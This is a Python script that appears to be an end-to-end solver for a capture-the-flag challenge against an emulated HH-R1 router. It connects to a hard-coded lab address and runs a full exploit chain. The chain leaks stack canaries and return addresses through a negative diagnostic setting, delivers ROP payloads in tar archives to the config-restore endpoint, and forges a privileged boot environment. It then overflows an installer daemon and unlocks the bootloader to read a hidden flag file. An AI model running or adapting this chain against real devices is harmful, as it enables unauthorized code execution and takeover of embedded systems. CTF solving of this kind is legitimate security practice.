#!/usr/bin/env python3
"""End-to-end solver for UHCON 2026 Final / Cold Boot."""

from __future__ import annotations

import base64
import hashlib
import http.client
import io
import json
import re
import socket
import struct
import sys
import tarfile
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parent
WORK = ROOT / "work"
VULN_WORK = ROOT / "vuln_work"
sys.path.insert(0, str(WORK))
sys.path.insert(0, str(VULN_WORK))

import build_installer_frames as installer_frames  # noqa: E402
import build_routerd_pax_rop as router_rop  # noqa: E402
import henv_tool  # noqa: E402
import hhboot_rop  # noqa: E402
import solve_unlock  # noqa: E402


HOST = "3.34.250.248"
UART_PORT = 1337
PROMPT = b"HH-R1(service)# "
DIAGNOSTIC_WINDOW = -0x4600
ROUTER_CANARY_OFF = 0x45D0
ROUTER_SAVED_X29_OFF = 0x45D8
ROUTER_SAVED_LR_OFF = 0x45E0
ROUTER_RETURN_OFF = 0x7748
INSTALL_CANARY_OFF = 0xE00
INSTALL_SAVED_X29_OFF = 0xE08
INSTALL_SAVED_LR_OFF = 0xE10
INSTALL_RETURN_OFF = 0x785C


def u64(blob: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", blob, offset)[0]


def add_regular(tf: tarfile.TarFile, name: str, data: bytes) -> None:
    info = tarfile.TarInfo(name)
    info.size = len(data)
    info.mode = 0o600
    info.uid = 0
    info.gid = 0
    info.mtime = 0
    info.type = tarfile.REGTYPE
    tf.addfile(info, io.BytesIO(data))


def regular_restore_tar(files: dict[str, bytes]) -> bytes:
    listed = [
        {"name": name, "sha256": hashlib.sha256(data).hexdigest()}
        for name, data in files.items()
    ]
    manifest = (
        json.dumps({"format": 2, "model": "HH-R1", "files": listed}, separators=(",", ":"))
        + "\n"
    ).encode()
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w", format=tarfile.USTAR_FORMAT) as tf:
        add_regular(tf, "manifest.json", manifest)
        for name, data in files.items():
            add_regular(tf, name, data)
    return output.getvalue()


class UART:
    def __init__(self, log_file: io.BufferedWriter):
        self.sock = socket.create_connection((HOST, UART_PORT), timeout=10)
        self.sock.settimeout(0.1)
        self.log_file = log_file

    def recv_until(self, marker: bytes, timeout: float) -> bytes:
        deadline = time.monotonic() + timeout
        data = bytearray()
        while marker not in data and time.monotonic() < deadline:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                raise RuntimeError(f"UART closed while waiting for {marker!r}")
            data.extend(chunk)
            self.log_file.write(chunk)
            self.log_file.flush()
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        if marker not in data:
            raise TimeoutError(f"UART marker not seen: {marker!r}")
        return bytes(data)

    def drain(self) -> bytes:
        """Consume output already queued before issuing the next command."""
        data = bytearray()
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                raise RuntimeError("UART closed while draining pending output")
            data.extend(chunk)
            self.log_file.write(chunk)
            self.log_file.flush()
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        return bytes(data)

    def command(self, line: str, timeout: float = 12.0) -> bytes:
        # The stop-autoboot keystroke can leave an extra empty-line prompt in
        # flight.  Do not let recv_until() satisfy the new command with that
        # stale prompt before its echo/response arrives.
        self.drain()
        wire = line.encode("ascii") + b"\n"
        self.log_file.write(b"\n[TX] " + wire)
        self.log_file.flush()
        self.sock.sendall(wire)
        return self.recv_until(PROMPT, timeout)

    def close(self) -> None:
        self.sock.close()


class HTTPClient:
    def __init__(self, port: int, password: str, evidence_dir: Path):
        self.port = port
        self.authorization = "Basic " + base64.b64encode(f"admin:{password}".encode()).decode()
        self.evidence_dir = evidence_dir
        self.counter = 0

    def request(
        self,
        method: str,
        path: str,
        body: bytes | None = None,
        content_type: str | None = None,
        timeout: float = 15.0,
        tolerate_disconnect: bool = False,
    ) -> tuple[int, dict[str, str], bytes]:
        self.counter += 1
        headers = {"Authorization": self.authorization, "Connection": "close"}
        if content_type is not None:
            headers["Content-Type"] = content_type
        conn = http.client.HTTPConnection(HOST, self.port, timeout=timeout)
        try:
            conn.request(method, path, body=body, headers=headers)
            response = conn.getresponse()
            data = response.read()
            result_headers = {key.lower(): value for key, value in response.getheaders()}
            status = response.status
        except (OSError, http.client.HTTPException) as exc:
            if not tolerate_disconnect:
                raise
            print(f"[http] {method} {path}: tolerated disconnect: {exc}")
            status, result_headers, data = 0, {}, b""
        finally:
            conn.close()
        stem = f"{self.counter:02d}_{method}_{path.strip('/').replace('/', '_')}"
        (self.evidence_dir / f"{stem}.body").write_bytes(data)
        print(f"[http] {method} {path}: status={status} body={len(data):#x}")
        return status, result_headers, data

    def restore(
        self, archive: bytes, *, timeout: float = 15.0, tolerate_disconnect: bool = False
    ) -> tuple[int, dict[str, str], bytes]:
        return self.request(
            "POST",
            "/api/config/restore",
            archive,
            "application/x-tar",
            timeout,
            tolerate_disconnect,
        )


def parse_banner(data: bytes) -> tuple[int, str, int]:
    text = data.decode(errors="replace")
    port_match = re.search(r"Web UI\s*: http://[^:]+:(\d+)/", text)
    password_match = re.search(r"Login\s*: admin / (\S+)", text)
    serial_match = re.search(r"Device serial:\s*([0-9a-fA-F]{16})", text)
    if not (port_match and password_match and serial_match):
        raise ValueError("remote-lab banner/boot output is incomplete")
    return int(port_match.group(1)), password_match.group(1), int(serial_match.group(1), 16)


def require_http_ok(status: int, body: bytes, operation: str) -> None:
    if status // 100 != 2:
        raise RuntimeError(f"{operation} failed: HTTP {status}, {body[:300]!r}")


def make_router_rop_tar(
    router_canary: int,
    router_base: int,
    router_saved_x29: int,
    prefixed_installer_frame: bytes,
) -> bytes:
    decoded, outer_sp, frame_ptr = router_rop.build_decoded(
        canary=router_canary,
        pie_base=router_base,
        saved_x29=router_saved_x29,
        frame=prefixed_installer_frame,
        client_fd=4,
    )
    print(
        f"[router rop] outer_sp={outer_sp:#x} frame_ptr={frame_ptr:#x} "
        f"frame={len(prefixed_installer_frame):#x}"
    )
    return router_rop.build_tar(decoded)


def parse_ext4_listing(output: bytes) -> list[tuple[str, int]]:
    candidates: list[tuple[str, int]] = []
    text = output.decode(errors="replace").replace("\r", "")
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or "<DIR>" in line or line.startswith("ext4ls"):
            continue
        match = re.match(r"^(\d+)\s+(.+?)\s*$", line)
        if match:
            size = int(match.group(1))
            name = match.group(2).split()[-1]
            if name not in (".", "..") and "/" not in name:
                candidates.append((name, size))
    candidates.sort(
        key=lambda item: (
            0 if any(word in item[0].lower() for word in ("flag", "proof", "cold", "secret")) else 1,
            item[0],
        )
    )
    return candidates


def parse_md_bytes(output: bytes) -> bytes:
    recovered = bytearray()
    text = output.decode(errors="replace").replace("\r", "")
    for line in text.splitlines():
        match = re.match(r"^\s*[0-9a-fA-F]{6,16}:\s+(.+)$", line)
        if not match:
            continue
        for token in match.group(1).split():
            if re.fullmatch(r"[0-9a-fA-F]{2}", token):
                recovered.append(int(token, 16))
            else:
                break
    return bytes(recovered)


def main() -> None:
    stamp = time.strftime("%Y%m%d-%H%M%S")
    evidence = WORK / f"live_{stamp}"
    evidence.mkdir(parents=True, exist_ok=False)
    uart_log = (evidence / "uart.log").open("wb")
    uart = UART(uart_log)
    try:
        startup = uart.recv_until(b"management plane", 20)
        web_port, password, serial = parse_banner(startup)
        print(f"\n[session] web={web_port} serial={serial:016x}")
        http = HTTPClient(web_port, password, evidence)

        settings = json.dumps(
            {
                "lan": "192.168.8.1/24",
                "dhcp": True,
                "channel": 44,
                "diagnostic_window": DIAGNOSTIC_WINDOW,
            },
            separators=(",", ":"),
        ).encode()
        diagnostic_tar = regular_restore_tar({"settings.json": settings})
        status, _, body = http.restore(diagnostic_tar)
        require_http_ok(status, body, "diagnostic settings restore")
        status, _, body = http.request("GET", "/api/support/attest")
        require_http_ok(status, body, "attestation stack priming")
        status, _, router_leak = http.request("GET", "/api/logs")
        require_http_ok(status, router_leak, "router stack leak")
        if len(router_leak) < ROUTER_SAVED_LR_OFF + 8:
            raise RuntimeError(f"short router leak: {len(router_leak):#x}")
        (evidence / "router_stack.bin").write_bytes(router_leak)

        router_canary = u64(router_leak, ROUTER_CANARY_OFF)
        router_saved_x29 = u64(router_leak, ROUTER_SAVED_X29_OFF)
        router_saved_lr = u64(router_leak, ROUTER_SAVED_LR_OFF)
        router_base = router_saved_lr - ROUTER_RETURN_OFF
        if router_base & 0xFFF or router_canary & 0xFF:
            raise RuntimeError("implausible routerd stack leak")
        print(
            f"[router] canary={router_canary:#018x} x29={router_saved_x29:#018x} "
            f"base={router_base:#018x}"
        )

        env0_generation = struct.unpack_from("<I", router_leak, 0x188)[0]
        env1_head = router_leak[0x480:0x780]
        if env1_head[:4] != b"HENV":
            raise RuntimeError("env1 was not present at router leak offset 0x480")
        env1_generation = struct.unpack_from("<I", env1_head, 8)[0]
        raw_env1 = env1_head + b"\xff" * (0x4000 - len(env1_head))
        raw_env1_path = evidence / "env1_original.bin"
        forged_env1_path = evidence / "env1_service.bin"
        raw_env1_path.write_bytes(raw_env1)
        henv_tool.forge(
            raw_env1_path,
            forged_env1_path,
            "service",
            "30",
            0x43544621,
            max(env0_generation, env1_generation) + 1,
            True,
        )
        forged_env1 = forged_env1_path.read_bytes()

        stage_tar = regular_restore_tar({"settings.json": settings, "bank.bin": forged_env1})
        status, _, body = http.restore(stage_tar)
        require_http_ok(status, body, "forged bank staging")

        status_frame = router_rop.installer_status_frame(0x1000)
        stage1_tar = make_router_rop_tar(router_canary, router_base, router_saved_x29, status_frame)
        (evidence / "router_stage1_install_leak.tar").write_bytes(stage1_tar)
        status, _, body = http.restore(stage1_tar, tolerate_disconnect=True)
        if status and status // 100 != 2:
            raise RuntimeError(f"router stage1 failed: HTTP {status} {body[:200]!r}")
        status, _, installer_leak = http.request("GET", "/api/support/result")
        require_http_ok(status, installer_leak, "installer stack leak retrieval")
        if len(installer_leak) < INSTALL_SAVED_LR_OFF + 8:
            raise RuntimeError(f"short installer leak: {len(installer_leak):#x}")
        (evidence / "installer_stack.bin").write_bytes(installer_leak)
        installer_canary = u64(installer_leak, INSTALL_CANARY_OFF)
        installer_saved_x29 = u64(installer_leak, INSTALL_SAVED_X29_OFF)
        installer_saved_lr = u64(installer_leak, INSTALL_SAVED_LR_OFF)
        installer_base = installer_saved_lr - INSTALL_RETURN_OFF
        if installer_base & 0xFFF or installer_canary & 0xFF:
            raise RuntimeError("implausible installerd stack leak")
        print(
            f"[installer] canary={installer_canary:#018x} "
            f"x29={installer_saved_x29:#018x} base={installer_base:#018x}"
        )

        record = installer_frames.make_record(
            serial_u64=serial,
            record_type=0x227,
            generation=struct.unpack_from("<I", forged_env1, 8)[0],
            source=forged_env1,
            staged_path="/tmp/restore/bank.bin",
        )
        extension = installer_frames.overflow_extension(installer_canary, installer_base + 0x7B48)
        installer_wire = installer_frames.make_frame(record, extension)
        prefixed_wire = struct.pack("<I", len(installer_wire)) + installer_wire
        stage2_tar = make_router_rop_tar(router_canary, router_base, router_saved_x29, prefixed_wire)
        (evidence / "router_stage2_env_write.tar").write_bytes(stage2_tar)
        http.restore(stage2_tar, timeout=20, tolerate_disconnect=True)
        time.sleep(0.5)

        status, _, body = http.request("GET", "/api/support/attest")
        require_http_ok(status, body, "post-write attestation")
        status, _, validation_leak = http.request("GET", "/api/logs")
        require_http_ok(status, validation_leak, "post-write HENV validation leak")
        (evidence / "post_write_stack.bin").write_bytes(validation_leak)
        if validation_leak[0x480:0x484] != b"HENV":
            raise RuntimeError("post-write env1 is missing")
        written_generation = struct.unpack_from("<I", validation_leak, 0x488)[0]
        wanted_generation = struct.unpack_from("<I", forged_env1, 8)[0]
        if written_generation != wanted_generation:
            raise RuntimeError(
                f"env1 write did not land: generation={written_generation}, wanted={wanted_generation}"
            )
        print(f"[env1] privileged write verified, generation={written_generation}")

        status, _, body = http.request("POST", "/api/system/reboot")
        require_http_ok(status, body, "device reboot")
        reboot_output = uart.recv_until(b"Console policy: service", 35)
        uart.sock.sendall(b"x\n")
        service_output = uart.recv_until(PROMPT, 12)
        combined = reboot_output + service_output
        nonce_match = re.search(rb"Maintenance nonce\s*:\s*(?:0x)?([0-9a-fA-F]{8})", combined)
        if not nonce_match:
            raise RuntimeError("maintenance nonce was not printed")
        nonce = int(nonce_match.group(1), 16)
        response = solve_unlock.solve(
            (ROOT / "static_rootfs_a" / "sbin" / "hhboot").read_bytes(), serial, nonce
        )
        unlock_output = uart.command(f"unlock {response:016x}")
        if b"authorized" not in unlock_output.lower():
            raise RuntimeError("hhboot maintenance unlock failed")

        # 0x118 bytes reaches canary, caller FP, and LR.  Keeping the response
        # under the UART gateway's long-line limit avoids a transport close.
        audit_output = uart.command("rmap audit 280", timeout=15)
        audit = hhboot_rop.extract_audit(audit_output.decode(errors="replace"))
        import_command, details = hhboot_rop.build_command(serial, audit)
        print("[hhboot] " + " ".join(f"{key}={value:#x}" for key, value in details.items()))
        uart.command(import_command, timeout=15)

        listing = uart.command("ext4ls rmap 0 /", timeout=15)
        (evidence / "ext4_listing.txt").write_bytes(listing)
        candidates = parse_ext4_listing(listing)
        if not candidates:
            raise RuntimeError("no regular file was found in hidden ext4 listing")
        print("[ext4] candidates=" + ", ".join(f"{name}({size})" for name, size in candidates))

        found_flag: bytes | None = None
        for name, listed_size in candidates:
            load_output = uart.command(f"ext4load rmap 0 0x100000 {name}", timeout=15)
            read_match = re.search(rb"(\d+) bytes read", load_output)
            if not read_match:
                continue
            size = int(read_match.group(1))
            if size <= 0 or size > 0x10000:
                continue
            dump_output = uart.command(f"md.b 0x100000 {size}", timeout=15)
            recovered = parse_md_bytes(dump_output)[:size]
            if not recovered and listed_size:
                continue
            (evidence / f"recovered_{name}").write_bytes(recovered)
            flag_match = re.search(rb"(?:UHCON|FLAG|flag)\{[^}\r\n]{1,256}\}", recovered)
            if flag_match:
                found_flag = flag_match.group(0)
                break
        if found_flag is None:
            raise RuntimeError("hidden files were read but no flag token was recognized")
        flag_text = found_flag.decode("ascii")
        (ROOT / "flag.txt").write_text(flag_text + "\n", encoding="utf-8")
        print(f"\n[FLAG] {flag_text}")
        print(f"[evidence] {evidence}")
    finally:
        uart.close()
        uart_log.close()


if __name__ == "__main__":
    main()
